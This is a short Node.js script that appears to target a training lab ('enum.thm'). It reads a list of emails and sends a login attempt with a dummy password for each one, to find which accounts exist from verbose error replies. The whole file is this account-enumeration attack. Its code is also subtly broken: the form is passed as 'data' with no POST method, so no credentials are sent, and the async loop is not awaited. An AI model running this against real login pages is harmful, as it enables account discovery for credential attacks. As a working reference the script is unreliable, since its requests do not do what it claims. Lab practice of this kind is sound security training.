import fs from 'node:fs/promises'
import { URL } from 'node:url';

const emailListFilePath = process.argv[2];

if (!emailListFilePath) {
    throw new Error("Email not provided!");
}

async function checkEmail(email) {
    if (!email) {
        throw new Error("Email not provided!");
        return false;
    }
    const url = new URL('http://enum.thm/labs/verbose_login/functions.php');
    const refererURL = "http://enum.thm/labs/verbose_login/"
    const headers = {
        'Host': url.host,
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': url.origin,
        'Connection': 'close',
        'Referer': refererURL,
    };
    const data = {
        'username': email,
        'password': 'password',  // Use a random password as we are only checking the email
        'function': 'login'
    };

    try {
        const response = await fetch(url, {
            headers: headers,
            data: data,
        });

        return await response.json();
    } catch (error) {
        throw new Error("Unable tp fetch URL!");
        return false;
    }
};

async function enumerateEmail(emailFile) {
    if (!emailFile) {
        throw new Error("Email not provided!");
        return false;
    }
    // read email list
    const text = await fs.readFile(emailFile, { encoding: "utf-8" });
    const arrayOfEmails = text.split("\n");

    arrayOfEmails.forEach(async (email) => {
        console.log(await checkEmail(email));
    })
};
await enumerateEmail(emailListFilePath);